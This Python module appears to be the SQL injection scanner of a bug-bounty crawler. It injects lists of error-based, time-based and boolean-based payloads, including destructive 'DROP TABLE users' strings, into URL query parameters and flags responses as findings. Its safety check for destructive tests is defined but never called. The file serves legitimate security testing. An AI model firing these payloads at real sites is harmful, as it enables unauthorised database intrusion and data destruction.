"""SQL Injection scanner for BugBountyCrawler."""

import re
import time
import asyncio
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode
import aiohttp

from .base import BaseScanner, ScanResult
from ..models.finding import Finding, FindingSeverity, FindingType


class SQLInjectionScanner(BaseScanner):
    """Scanner for SQL injection vulnerabilities."""
    
    def __init__(self, settings, rate_limiter=None):
        """Initialize SQL injection scanner."""
        super().__init__(settings, rate_limiter)
        self.name = "SQLInjectionScanner"
        
        # SQL injection payloads
        self.error_based_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "\" OR 1=1#",
            "' OR 'x'='x",
            "\" OR \"x\"=\"x",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "') OR ('x'='x",
            "\") OR (\"x\"=\"x",
            "' OR '1'='1' /*",
            "\" OR \"1\"=\"1\" /*",
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "\" UNION SELECT NULL, NULL--",
            "'; DROP TABLE users--",
            "\"; DROP TABLE users--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]
        
        self.time_based_payloads = [
            "' AND SLEEP(5)--",
            "\" AND SLEEP(5)--",
            "' AND (SELECT SLEEP(5))--",
            "\" AND (SELECT SLEEP(5))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
            "\" AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
            "' AND PG_SLEEP(5)--",
            "\" AND PG_SLEEP(5)--",
            "' AND WAITFOR DELAY '00:00:05'--",
            "\" AND WAITFOR DELAY '00:00:05'--",
        ]
        
        self.boolean_based_payloads = [
            "' AND '1'='1",
            "\" AND \"1\"=\"1",
            "' AND '1'='2",
            "\" AND \"1\"=\"2",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "\" AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "\" AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        ]
        
        # Error patterns to detect SQL injection
        self.error_patterns = [
            r"mysql_fetch_array\(\)",
            r"ORA-01756",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"ODBC SQL Server Driver",
            r"ODBC Microsoft Access Driver",
            r"SQLServer JDBC Driver",
            r"PostgreSQL query failed",
            r"Warning: mysql_",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
            r"PostgreSQL.*ERROR",
            r"Warning: pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Warning: sqlite_",
            r"SQLite error",
            r"SQLSTATE\[",
            r"SQL syntax.*MySQL",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
            r"ORA-00933: SQL command not properly ended",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"Fatal error:",
            r"mysql_num_rows\(\)",
            r"mysql_numfields\(\)",
            r"mysql_query\(\)",
            r"mysql_fetch_assoc\(\)",
            r"mysql_fetch_row\(\)",
            r"mysql_fetch_object\(\)",
            r"mysql_result\(\)",
            r"mysql_db_query\(\)",
            r"mysql_list_dbs\(\)",
            r"mysql_list_tables\(\)",
            r"mysql_list_fields\(\)",
            r"mysql_free_result\(\)",
            r"mysql_close\(\)",
            r"mysql_connect\(\)",
            r"mysql_select_db\(\)",
            r"mysql_create_db\(\)",
            r"mysql_drop_db\(\)",
            r"mysql_data_seek\(\)",
            r"mysql_insert_id\(\)",
            r"mysql_affected_rows\(\)",
            r"mysql_errno\(\)",
            r"mysql_error\(\)",
            r"mysql_ping\(\)",
            r"mysql_stat\(\)",
            r"mysql_thread_id\(\)",
            r"mysql_info\(\)",
            r"mysql_get_server_info\(\)",
            r"mysql_get_client_info\(\)",
            r"mysql_get_host_info\(\)",
            r"mysql_get_proto_info\(\)",
            r"mysql_list_processes\(\)",
            r"mysql_list_dbs\(\)",
            r"mysql_list_tables\(\)",
            r"mysql_list_fields\(\)",
            r"mysql_db_name\(\)",
            r"mysql_db_query\(\)",
            r"mysql_fetch_array\(\)",
            r"mysql_fetch_assoc\(\)",
            r"mysql_fetch_object\(\)",
            r"mysql_fetch_row\(\)",
            r"mysql_result\(\)",
            r"mysql_num_rows\(\)",
            r"mysql_numfields\(\)",
            r"mysql_query\(\)",
            r"mysql_select_db\(\)",
            r"mysql_create_db\(\)",
            r"mysql_drop_db\(\)",
            r"mysql_data_seek\(\)",
            r"mysql_insert_id\(\)",
            r"mysql_affected_rows\(\)",
            r"mysql_errno\(\)",
            r"mysql_error\(\)",
            r"mysql_ping\(\)",
            r"mysql_stat\(\)",
            r"mysql_thread_id\(\)",
            r"mysql_info\(\)",
            r"mysql_get_server_info\(\)",
            r"mysql_get_client_info\(\)",
            r"mysql_get_host_info\(\)",
            r"mysql_get_proto_info\(\)",
            r"mysql_list_processes\(\)",
        ]
        
        # Time threshold for time-based detection (in seconds)
        self.time_threshold = 3.0
        
        # Response size difference threshold for boolean-based detection
        self.size_threshold = 100
    
    async def scan_url(self, url: str) -> ScanResult:
        """Scan URL for SQL injection vulnerabilities."""
        findings = []
        errors = []
        response_time = 0.0
        status_code = 0
        headers = {}
        content_length = 0
        
        try:
            # Make baseline request
            baseline_response = await self.make_request(url)
            response_time = baseline_response.headers.get("X-Response-Time", 0.0)
            status_code = baseline_response.status
            headers = dict(baseline_response.headers)
            content_length = int(baseline_response.headers.get("Content-Length", 0))
            
            baseline_content = await baseline_response.text()
            baseline_size = len(baseline_content)
            
            # Parse URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if not query_params:
                # No parameters to test
                return ScanResult(
                    url=url,
                    findings=findings,
                    errors=errors,
                    response_time=response_time,
                    status_code=status_code,
                    headers=headers,
                    content_length=content_length
                )
            
            # Test each parameter for SQL injection
            for param_name, param_values in query_params.items():
                if param_values:
                    original_value = param_values[0]
                    
                    # Test error-based SQL injection
                    error_findings = await self._test_error_based_injection(
                        url, param_name, original_value, baseline_content
                    )
                    findings.extend(error_findings)
                    
                    # Test time-based SQL injection
                    time_findings = await self._test_time_based_injection(
                        url, param_name, original_value
                    )
                    findings.extend(time_findings)
                    
                    # Test boolean-based SQL injection
                    boolean_findings = await self._test_boolean_based_injection(
                        url, param_name, original_value, baseline_size
                    )
                    findings.extend(boolean_findings)
            
        except Exception as e:
            errors.append(str(e))
        
        return ScanResult(
            url=url,
            findings=findings,
            errors=errors,
            response_time=response_time,
            status_code=status_code,
            headers=headers,
            content_length=content_length
        )
    
    async def _test_error_based_injection(self, url: str, param_name: str, 
                                        original_value: str, baseline_content: str) -> List[Finding]:
        """Test for error-based SQL injection."""
        findings = []
        
        for payload in self.error_based_payloads[:10]:  # Test first 10 payloads
            try:
                # Create test URL with payload
                test_url = self._create_test_url(url, param_name, payload)
                
                response = await self.make_request(test_url)
                content = await response.text()
                
                # Check for SQL error patterns
                for pattern in self.error_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.SQL_INJECTION,
                            title=f"SQL Injection - Error Based (Parameter: {param_name})",
                            description=f"Error-based SQL injection detected in parameter '{param_name}' using payload: {payload}",
                            severity=FindingSeverity.CRITICAL,
                            impact="SQL injection can lead to complete database compromise, data theft, and system takeover",
                            likelihood="high",
                            risk_score=9.5,
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://cwe.mitre.org/data/definitions/89.html"
                            ],
                            raw_data={
                                "parameter": param_name,
                                "payload": payload,
                                "error_pattern": pattern,
                                "response_content": content[:500] if len(content) > 500 else content,
                                "injection_type": "error_based"
                            }
                        )
                        findings.append(finding)
                        break  # Found vulnerability, no need to test more patterns
                
                # Small delay to avoid overwhelming the server
                await asyncio.sleep(0.1)
                
            except Exception as e:
                continue  # Skip failed tests
        
        return findings
    
    async def _test_time_based_injection(self, url: str, param_name: str, 
                                       original_value: str) -> List[Finding]:
        """Test for time-based SQL injection."""
        findings = []
        
        for payload in self.time_based_payloads[:5]:  # Test first 5 payloads
            try:
                # Create test URL with payload
                test_url = self._create_test_url(url, param_name, payload)
                
                # Measure response time
                start_time = time.time()
                response = await self.make_request(test_url)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # Check if response time indicates SQL injection
                if response_time >= self.time_threshold:
                    finding = self.create_finding(
                        url=url,
                        finding_type=FindingType.SQL_INJECTION,
                        title=f"SQL Injection - Time Based (Parameter: {param_name})",
                        description=f"Time-based SQL injection detected in parameter '{param_name}' using payload: {payload}. Response time: {response_time:.2f}s",
                        severity=FindingSeverity.CRITICAL,
                        impact="Time-based SQL injection can lead to complete database compromise through blind extraction",
                        likelihood="high",
                        risk_score=9.0,
                        references=[
                            "https://owasp.org/www-community/attacks/SQL_Injection",
                            "https://cwe.mitre.org/data/definitions/89.html"
                        ],
                        raw_data={
                            "parameter": param_name,
                            "payload": payload,
                            "response_time": response_time,
                            "threshold": self.time_threshold,
                            "injection_type": "time_based"
                        }
                    )
                    findings.append(finding)
                
                # Small delay to avoid overwhelming the server
                await asyncio.sleep(0.2)
                
            except Exception as e:
                continue  # Skip failed tests
        
        return findings
    
    async def _test_boolean_based_injection(self, url: str, param_name: str, 
                                          original_value: str, baseline_size: int) -> List[Finding]:
        """Test for boolean-based SQL injection."""
        findings = []
        
        try:
            # Test true condition
            true_payload = "' AND '1'='1"
            true_url = self._create_test_url(url, param_name, true_payload)
            true_response = await self.make_request(true_url)
            true_content = await true_response.text()
            true_size = len(true_content)
            
            # Test false condition
            false_payload = "' AND '1'='2"
            false_url = self._create_test_url(url, param_name, false_payload)
            false_response = await self.make_request(false_url)
            false_content = await false_response.text()
            false_size = len(false_content)
            
            # Check for size difference indicating boolean-based injection
            size_difference = abs(true_size - false_size)
            
            if size_difference >= self.size_threshold:
                finding = self.create_finding(
                    url=url,
                    finding_type=FindingType.SQL_INJECTION,
                    title=f"SQL Injection - Boolean Based (Parameter: {param_name})",
                    description=f"Boolean-based SQL injection detected in parameter '{param_name}'. Response size difference: {size_difference} bytes",
                    severity=FindingSeverity.CRITICAL,
                    impact="Boolean-based SQL injection can lead to complete database compromise through blind extraction",
                    likelihood="high",
                    risk_score=9.0,
                    references=[
                        "https://owasp.org/www-community/attacks/SQL_Injection",
                        "https://cwe.mitre.org/data/definitions/89.html"
                    ],
                    raw_data={
                        "parameter": param_name,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "true_size": true_size,
                        "false_size": false_size,
                        "size_difference": size_difference,
                        "threshold": self.size_threshold,
                        "injection_type": "boolean_based"
                    }
                )
                findings.append(finding)
            
            # Small delay to avoid overwhelming the server
            await asyncio.sleep(0.1)
            
        except Exception as e:
            pass  # Skip failed tests
        
        return findings
    
    def _create_test_url(self, url: str, param_name: str, payload: str) -> str:
        """Create test URL with SQL injection payload."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Replace the parameter value with payload
        query_params[param_name] = [payload]
        
        # Rebuild URL
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if new_query:
            new_url += f"?{new_query}"
        
        return new_url
    
    def _extract_parameters_from_url(self, url: str) -> Dict[str, List[str]]:
        """Extract parameters from URL."""
        try:
            parsed = urlparse(url)
            return parse_qs(parsed.query)
        except Exception:
            return {}
    
    def _is_safe_parameter(self, param_name: str, param_value: str) -> bool:
        """Check if parameter is safe to test (avoid destructive operations)."""
        # Avoid testing certain parameters that might cause issues
        dangerous_params = ['password', 'passwd', 'pwd', 'secret', 'token', 'key']
        
        if param_name.lower() in dangerous_params:
            return False
        
        # Avoid testing parameters with certain values
        dangerous_values = ['delete', 'drop', 'truncate', 'alter', 'create']
        
        if any(value.lower() in param_value.lower() for value in dangerous_values):
            return False
        
        return True
